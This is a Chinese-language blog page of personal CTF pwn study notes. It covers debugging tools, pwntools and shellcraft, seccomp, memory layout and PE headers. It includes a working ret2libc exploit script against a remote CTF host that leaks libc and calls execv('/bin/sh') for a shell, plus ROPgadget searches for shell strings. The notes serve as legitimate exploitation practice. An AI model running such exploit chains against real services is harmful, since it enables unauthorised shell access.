<p><img src="https://i.imgur.com/Sgk9KFI.png"></p>
<p>比如说这个puts改成system，那就是改成4a</p>
<h2 id="调试语句context"><a href="#调试语句context" class="headerlink" title="调试语句context"></a>调试语句context</h2><p><img src="https://i.imgur.com/ThdJ1Sy.png"></p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><blockquote>
<p>LD_PRELOAD=/lib/i386-linux-gnu/libc.so.6 ./hello_Pwner</p>
<p>ps -el</p>
<p>sudo gdb attach  pid</p>
</blockquote>
<h2 id="添加结构体"><a href="#添加结构体" class="headerlink" title="添加结构体"></a>添加结构体</h2><p><img src="https://i.imgur.com/dWNa1id.png"></p>
<p>insert 就能添加一个结构体；</p>
<p><img src="https://i.imgur.com/ccp85X3.png"></p>
<p>d 能改变大小  expand能扩大结构体大小</p>
<p>然后返回</p>
<p><img src="https://i.imgur.com/lFPTjAy.png"></p>
<p>把ptr的数据类型改成</p>
<p><img src="https://i.imgur.com/A8fpUd4.png"></p>
<p><img src="https://i.imgur.com/yrpiMFV.png"></p>
<p><img src="https://i.imgur.com/osqHnju.png"></p>
<h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><p><img src="https://i.imgur.com/A21QNBj.png"></p>
<h2 id="堆的经典exp"><a href="#堆的经典exp" class="headerlink" title="堆的经典exp"></a>堆的经典exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch_gdb</span>():</span></span><br><span class="line">    context.terminal =[<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freenote</span>(<span class="params">idx</span>):</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pusnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">launch_gdb()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="分号后面的-命令照常执行"><a href="#分号后面的-命令照常执行" class="headerlink" title="分号后面的 命令照常执行"></a>分号后面的 命令照常执行</h2><p><img src="https://i.imgur.com/hYAHknq.png"></p>
<h2 id="kali下更换python版本"><a href="#kali下更换python版本" class="headerlink" title="kali下更换python版本"></a>kali下更换python版本</h2><p>update-alternatives –install /usr/bin/python python /usr/bin/python2 100</p>
<p>update-alternatives –install /usr/bin/python python /usr/bin/python3 150</p>
<p>update-alternatives –config python</p>
<h2 id="kali安装volatility源代码"><a href="#kali安装volatility源代码" class="headerlink" title="kali安装volatility源代码"></a>kali安装volatility源代码</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/102393293">后渗透篇：利用Volatility进行入侵痕迹分析_bylfsj的博客-CSDN博客</a></p>
<blockquote>
<p>volatility用挺好的</p>
</blockquote>
<p>python setup.py install</p>
<p>发现还得安装密码之类的东西就stackoverflow上面的解决方法安装下来</p>
<p>还有python vol.py  这玩意也得执行</p>
<h2 id="linux递归查找某个目录下包含某个字符串的所有文件"><a href="#linux递归查找某个目录下包含某个字符串的所有文件" class="headerlink" title="linux递归查找某个目录下包含某个字符串的所有文件"></a>linux递归查找某个目录下包含某个字符串的所有文件</h2><blockquote>
<p>grep -rn “TrapFrame” /home/eetan/volatility</p>
</blockquote>
<h2 id="查看软件路径"><a href="#查看软件路径" class="headerlink" title="查看软件路径"></a>查看软件路径</h2><p>whereis 软件</p>
<h2 id="python接收固定位置字符"><a href="#python接收固定位置字符" class="headerlink" title="python接收固定位置字符"></a>python接收固定位置字符</h2><p>u（这是个字符串）[0:8]  取第一个到第八</p>
<p>puts_addr=u64(p.recv(6).ljust(8,’\x00’))  接收六个字符，然后格式化为8字节，用00补齐</p>
<p>i=p.recvuntil(‘:’,drop=True)  这个是接收到：前面的内容，如果没有drop=true 就是包括：。</p>
<p>leak = u64(io.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))</p>
<h2 id="python类型转换"><a href="#python类型转换" class="headerlink" title="python类型转换"></a>python类型转换</h2><p>p64()这里面要的是int类型</p>
<p>addr=int(i,16)  转换为int类型的16进制变10进制  输出10进制【i是十六进制】</p>
<h2 id="windows和其他操作系统调用协议的不同"><a href="#windows和其他操作系统调用协议的不同" class="headerlink" title="windows和其他操作系统调用协议的不同"></a>windows和其他操作系统调用协议的不同</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions">https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions</a></p>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="shellcraft用法"><a href="#shellcraft用法" class="headerlink" title="shellcraft用法"></a>shellcraft用法</h3><h4 id="经典用法："><a href="#经典用法：" class="headerlink" title="经典用法："></a>经典用法：</h4><p>shellcode=asm(shellcraft.sh())</p>
<p>调用 open read 和 write：</p>
<p>shellcode = shellcraft.open(‘/flag’) </p>
<p>shellcode += shellcraft.read(‘eax’,’esp’,100) </p>
<p>shellcode += shellcraft.write(1,’esp’,100) </p>
<p>shellcode = asm(shellcode)</p>
<h4 id="用例：pwnable的orw"><a href="#用例：pwnable的orw" class="headerlink" title="用例：pwnable的orw"></a>用例：pwnable的orw</h4><h5 id="orw-seccomp函数"><a href="#orw-seccomp函数" class="headerlink" title="orw_seccomp函数"></a>orw_seccomp函数</h5><blockquote>
<p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200827112103152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzY4NzQ5,size_16,color_FFFFFF,t_70#pic_center"></p>
<blockquote>
<p><code>orw_seccomp函数</code>执行了两次<code>prctl</code>函数</p>
<p>第一次调用prctl函数 ————禁止提权 第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit</p>
</blockquote>
<p>意思就是我们不能使用特殊的系统调用<code>getshell</code>，但是可以用<code>open</code>、<code>read</code>、<code>write</code>三个系统调用去读flag。</p>
<p>打开flag文件：sys_open(file,0,0)；调用号为5</p>
<p>读取flag文件：sys_read(3,file,0x100)；调用号为3</p>
<p>输出flag文件：sys_write(1,file,0x30)；系统调用号为4</p>
<h2 id="内存布局和cpu如何寻址"><a href="#内存布局和cpu如何寻址" class="headerlink" title="内存布局和cpu如何寻址"></a>内存布局和cpu如何寻址</h2><p><a target="_blank" rel="noopener" href="https://lzwgiter.github.io/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E4%B8%8E%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/">内存布局与栈溢出&amp;堆溢出原理 · float’s blog (lzwgiter.github.io)</a></p>
<p>架构：32位x86</p>
<p>每个进程都拥有2^32的虚拟空间，也就是4G，其中1G为内核占有（R0），3G为用户空间(R3)</p>
<p><img src="https://i.imgur.com/nYK7QRG.png"></p>
<p>更详细的一张图：</p>
<p><img src="https://i.imgur.com/HrX69QD.png"></p>
<p>这块4G的虚拟内存由两部分构成：物理内存和磁盘</p>
<p>所以当程序需要访问某个地址数据时，需要进行一个地址转换的工作，这个工作由MMU(Memory Management Unity)完成。</p>
<p>所以为了方便进行数据的查找以及空间的划分，虚拟页表就诞生了，简单来说，虚拟页表的工作是将虚拟内存中的地址映射到物理内存中，当CPU访问一个虚拟地址时，在内存中没有映射进对应的页，此时就会发生缺页异常，就会将虚拟内存中的数据通过MMU单元的翻译映射到物理内存中去。</p>
<p>程序中的段，如<code>.text</code>, <code>.data</code>等并不是在程序运行时就全部加载到物理内存的，而是只建立上述的虚拟页表，当需要这个数据，发生缺页错误的时候，才会将对应的数据映射到物理内存中供CPU使用。</p>
<p>具体如何寻址：</p>
<p><img src="https://i.imgur.com/NtGyBMK.png"></p>
<p>32位虚拟进程空间，linux 1:3  windows 2:2</p>
<p>PAE，物理地址空间扩展，让程序占用的内存超过4g。</p>
<p>处理方法：Intel通过在处理器上把管脚数从32增加到36，以提高处理器的寻址能力，使其达到2^36=64GB，然而线性地址的位数仍然是32位，为此，需引入一种新的分页机制。从pentium pro处理器开始，intel引入一种PAE机制，另外一种叫做页大小扩展机制（PSE）在pentium III中引入，但是linux没有采用</p>
<p>为了节省物理内存，采取动态装入的方法，有覆盖装入和页映射</p>
<p>覆盖装入：程序员自己来分割程序，并且写一个管理覆盖的程序，该程序常驻内存。</p>
<p>main（1024）、A（512）、B（256）模块，</p>
<p>main会分别轮次调用A、B模块，AB之间不会相互调用，于是</p>
<p><img src="https://i.imgur.com/oOXHfpF.png"></p>
<p>调用main装入，调用a装入，调用b覆盖a装入，节省了256byte的空间。</p>
<p>页映射：把程序分成好几个页，有一个装载管理器</p>
<p><img src="https://i.imgur.com/j8NBPc8.png"></p>
<p><img src="https://i.imgur.com/rB8Aw82.png"></p>
<p>如果装满了，后期要调用别的程序页，则采取一些算法选择把哪个页调换出去。</p>
<p>这个装载管理器就是现代操作系统，更深就是操作系统的存储管理器</p>
<p>进程建立：</p>
<p><img src="https://i.imgur.com/nbR72RR.png"></p>
<p>pe磁盘文件：dos头、pe头、块表、.text块、.rdata块、.data块</p>
<p>windows上的可执行文件</p>
<p><img src="https://i.imgur.com/nRCFfis.png"></p>
<p><img src="https://i.imgur.com/ABfXVC3.png"></p>
<ol>
<li><pre><code class="c">1.  **typedef** **struct** _IMAGE_SECTION_HEADER  
2.  &#123; 
3.  +0h **BYTE** Name[IMAGE_SIZEOF_SHORT_NAME]; // 节表名称,如“.text”  
4.  //IMAGE_SIZEOF_SHORT_NAME=8 
5.  **union** 
6.  +8h &#123; 
7.  **DWORD** PhysicalAddress; // 物理地址 
8.  **DWORD** VirtualSize; // 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一 
9.  // 般是取后一个 
10.  &#125; Misc; 
11.  +ch **DWORD** VirtualAddress; // 节区的 RVA 地址 
12.  +10h **DWORD** SizeOfRawData; // 在文件中对齐后的尺寸 
13.  +14h **DWORD** PointerToRawData; // 在文件中的偏移量 
14.  +18h **DWORD** PointerToRelocations; // 在OBJ文件中使用，重定位的偏移 
15.  +1ch **DWORD** PointerToLinenumbers; // 行号表的偏移（供调试使用地） 
16.  +1eh **WORD** NumberOfRelocations; // 在OBJ文件中使用，重定位项数目 
17.  +20h **WORD** NumberOfLinenumbers; // 行号表中行号的数目 
18.  +24h **DWORD** Characteristics; // 节属性如可读，可写，可执行等&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 
19.  &#125; 
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">pe文件头：</span><br><span class="line"></span><br><span class="line">pe头数据结构，三部分组成</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;cpp</span><br><span class="line">typedef struct IMAGE_NT_HEADERS&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      DWORD Signature;&#x2F;&#x2F;pe头标识 50h,45h, 00h, 00h. 即“PE\0\0”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#x2F;&#x2F;OptionalHeader字段：IMAGE_OPTIONAL_HEADER（可选映像头）是一个可选的机构，实际上IMAGE_FILE_HEADER结构不足以定义PE文件属性，因此可选映像头中定义了更多的数据(https:&#x2F;&#x2F;blog.csdn.net&#x2F;zhyulo&#x2F;article&#x2F;details&#x2F;85717711)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;IMAGE_NT_HEADERS,*PIMAGE_NT_HEADERS; </span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fileheder字段 IMAGE_FILE_HEADER这个结构包含了文件的物理层信息及文件属性。共二十字节数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;					<span class="comment">//运行平台</span></span><br><span class="line">    WORD    NumberOfSections;			<span class="comment">//文件的区块数目</span></span><br><span class="line">    DWORD   TimeDateStamp;				<span class="comment">//文件创建日期和时间</span></span><br><span class="line">    DWORD   PointerToSymbolTable;		<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line">    DWORD   NumberOfSymbols;			<span class="comment">//符号表中符号个数（用于调试）</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;		<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line">    WORD    Characteristics;			<span class="comment">//文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>动态链接有关知识点</p>
<p>位置无关代码(PIC)</p>
<p><img src="https://i.imgur.com/isGruVm.png"></p>
<p><img src="https://i.imgur.com/K4k6mGo.png"></p>
<h2 id="堆的学习，堆表和堆块"><a href="#堆的学习，堆表和堆块" class="headerlink" title="堆的学习，堆表和堆块"></a>堆的学习，堆表和堆块</h2><p>堆表：空闲双向链表、快速单向链表</p>
<blockquote>
<p>堆表用来索引堆块位置，只索引空闲态的堆块。这些堆块就是用来满足程序员申请堆空间的要求。</p>
</blockquote>
<h2 id="有价值的博客"><a href="#有价值的博客" class="headerlink" title="有价值的博客"></a>有价值的博客</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11587808.html">https://www.cnblogs.com/luoleqi/p/11587808.html</a>  pwnki的博客</p>
<h2 id="ida动态调试布置过程"><a href="#ida动态调试布置过程" class="headerlink" title="ida动态调试布置过程"></a>ida动态调试布置过程</h2><p>1.将linuxserver文件都放入linux中</p>
<p>2.启动linuxserver对应位数的文件</p>
<p><img src="https://i.imgur.com/4F5aPoD.png"></p>
<p>出现问题：</p>
<blockquote>
<p>sudo apt-get install libstdc++6</p>
<p>sudo apt-get install lib32stdc++6</p>
</blockquote>
<p><img src="https://i.imgur.com/gq1J27I.png"></p>
<p>这个界面出现表示成功。</p>
<p>但是后面如果出现</p>
<blockquote>
<p>The debugger could not attach to the selected process.</p>
<p>This can perhaps indicate the process was just terminated, or that you don’t have the necessary privileges.</p>
</blockquote>
<p>则要重新sudo ./linux_server</p>
<p>设置ida里面：</p>
<p><img src="https://i.imgur.com/gWsZ1GU.png"></p>
<p><img src="https://i.imgur.com/KfIcpYe.png"></p>
<p>设置完毕直接attach process选择你已经打开的进程。</p>
<p>就能成功ida动态调试。</p>
<h2 id="无基地址的调试"><a href="#无基地址的调试" class="headerlink" title="无基地址的调试"></a>无基地址的调试</h2><p>618 提问：</p>
<p>像libc的pwn题那种去掉符号的程序该怎么调试？开了地址随机化不知道怎么定位。我现在都是用pwntools加载执行程序，到需要的时候暂停，然后gdb attach去调，有没有其他的骚操作能方便一点</p>
<p>cat /proc/pid/maps 找加载基地址，然后ida打开程序rebase设置基地址，然后gdb直接在地址下断。</p>
<h2 id="linux下程序的加载、运行和终止流程"><a href="#linux下程序的加载、运行和终止流程" class="headerlink" title="linux下程序的加载、运行和终止流程"></a>linux下程序的加载、运行和终止流程</h2><p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiqingwu/p/linux_binary_load_and_run.html">转] Linux下程序的加载、运行和终止流程 - JollyWing - 博客园 (cnblogs.com)</a></p>
<h1 id="docker-pwn"><a href="#docker-pwn" class="headerlink" title="docker pwn"></a>docker pwn</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/iw1210/article/details/84674936">创建新Docker容器时出现“The container name “/xxx” is already in use by container xxxxxxxxxxx…”问题的解决办法_iw1210的专栏-CSDN博客</a></p>
<p>一、Docker 安装<br>1.使用官方安装脚本自动安装<br>curl -fsSL <a target="_blank" rel="noopener" href="https://get.docker.com/">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p>
<p>也可以使用国内 daocloud 一键安装命令：<br>curl -sSL <a target="_blank" rel="noopener" href="https://get.daocloud.io/docker">https://get.daocloud.io/docker</a> | sh</p>
<p>apt安装docker-compose：<br>apt-get install docker docker-compose</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/Eadom/ctf_xinetd.git">https://github.com/Eadom/ctf_xinetd.git</a></p>
<p>把题目可执行文件和flag放在ctf_xinetd/bin中</p>
<p>回到ctf_xinetd目录下，修改ctf.xinetd<br>把图片箭头指向的 <code>helloworld</code> 改成bin文件夹中题目的名字</p>
<p>在ctf_xinetd目录下 <code>sudo docker build -t &quot;pwn&quot; .</code></p>
<p>在ctf_xinetd目录下 docker run -d -p “0.0.0.0:pub_port:9999” -h “pwn” –name=”pwn” pwn<br>-h：指定容器的hostname<br>pub_port：改成你想放置的端口号，建议如8001，8002…等<br>pub_port is the port you want to expose to the public network.</p>
<p>此时输入docker ps 会发现题目容器已经启动了，可以nc 0.0.0.0 pub_port进行测试一下（pub_port：改成你想放置的端口号）</p>
<p>我每次重新下载 布置题目</p>
<hr>
<h2 id="windbg使用"><a href="#windbg使用" class="headerlink" title="windbg使用"></a>windbg使用</h2><p>问题集合：</p>
<p>dbghelp.dll更换</p>
<p>下断点</p>
<p>进入main函数，!dh -a 第一个modload的名字</p>
<p><img src="https://i.imgur.com/uCGqoii.png"></p>
<p><img src="https://i.imgur.com/nVQnpiQ.png"></p>
<p><img src="https://i.imgur.com/C7yuiUE.png"></p>
<p>bp 0x400000+0x14e0</p>
<p>显示error则再下一遍，（k查看堆栈,u查看汇编\x函数查找）</p>
<h3 id="为什么ps-el-用gdb开启的程序的内核函数是ptrace，因为gdb的原理就是用ptrace做的"><a href="#为什么ps-el-用gdb开启的程序的内核函数是ptrace，因为gdb的原理就是用ptrace做的" class="headerlink" title="为什么ps -el 用gdb开启的程序的内核函数是ptrace，因为gdb的原理就是用ptrace做的"></a>为什么ps -el 用gdb开启的程序的内核函数是ptrace，因为gdb的原理就是用ptrace做的</h3><h3 id="ropgadget-简单使用"><a href="#ropgadget-简单使用" class="headerlink" title="ropgadget 简单使用"></a>ropgadget 简单使用</h3><p>ROPgadget –binary 文件名 –only “pop|ret”|grep rdi</p>
<p>ROPgadget –binary 文件名 –string ‘bin/sh’</p>
<p>ROPgadget –binary 文件名 –only ‘int’</p>
<blockquote>
<p>ROPgadget –binary ./ret2syscall –only ‘int’</p>
</blockquote>
<h3 id="pwntools-ubuntu16-04源码安装"><a href="#pwntools-ubuntu16-04源码安装" class="headerlink" title="pwntools ubuntu16.04源码安装"></a>pwntools ubuntu16.04源码安装</h3><p><a target="_blank" rel="noopener" href="https://www.programminghunter.com/article/1308515284/">https://www.programminghunter.com/article/1308515284/</a> –失败了</p>
<h2 id="符号、链接、符号表"><a href="#符号、链接、符号表" class="headerlink" title="符号、链接、符号表"></a>符号、链接、符号表</h2><p>符号就是其实程序中的变量名、函数名。</p>
<blockquote>
<p>符号定义的本质是：指被分配了存储空间。如果是函数名则指代码所在区；如果是变量名则&gt;指其所在的静态数据区。<br>所有定义的符号的值就是其目标所在的首地址。<br>因此，符号的解析就是将符号引用和符号定义建立关联后，将引用符号的地址重定位为相关联的符号定义的地址。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013318019/article/details/104480820">https://blog.csdn.net/u013318019/article/details/104480820</a>  链接之符号和符号表</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/astrotycoon/article/details/8008629">https://blog.csdn.net/astrotycoon/article/details/8008629</a>   强弱符号</p>
<blockquote>
<p>在C语言中，函数和初始化的全局变量（包括显示初始化为0）是强符号，未初始化的全局变量是弱符号。</p>
</blockquote>
<blockquote>
<p>对于它们，下列三条规则使用：<br>① 同名的强符号只能有一个，否则编译器报”重复定义”错误。<br>② 允许一个强符号和多个弱符号，但定义会选择强符号的。<br>③ 当有多个弱符号相同时，链接器选择最先出现那个，也就是与链接顺序有关。</p>
</blockquote>
<h3 id="不能用system用execv"><a href="#不能用system用execv" class="headerlink" title="不能用system用execv"></a>不能用system用execv</h3><p>libc2.27中system函数的坑：</p>
<p><a target="_blank" rel="noopener" href="http://homura.cc/blog/archives/168">http://homura.cc/blog/archives/168</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;182.116.62.85&quot;</span>,<span class="number">21613</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc6_2.27-3ubuntu1.4_amd64.so&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./babyof&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400743</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0400741</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(<span class="number">0x40066b</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;I hope you win&quot;</span>)</span><br><span class="line">puts=u64(p.recv()[<span class="number">1</span>:<span class="number">7</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">print(puts)</span><br><span class="line">libc_puts=libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">libcbase=puts-libc_puts</span><br><span class="line"></span><br><span class="line">execv=libcbase+libc.symbols[<span class="string">&#x27;execv&#x27;</span>]</span><br><span class="line">binsh=libcbase+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="number">8</span>*<span class="string">&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(binsh)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execv)</span><br><span class="line">log.success(<span class="string">&quot;leak_puts   ==&gt; 0x%x&quot;</span> % puts)</span><br><span class="line">log.success(<span class="string">&quot;leak_base   ==&gt; 0x%x&quot;</span> % libcbase)</span><br><span class="line">log.success(<span class="string">&quot;leak_execv  ==&gt; 0x%x&quot;</span> % execv)</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr  ==&gt; 0x%x&quot;</span> % binsh)</span><br><span class="line"><span class="comment">#payload1=&#x27;a&#x27;*0x40+8*&#x27;a&#x27;+p64(0x40066b)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">eetan</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
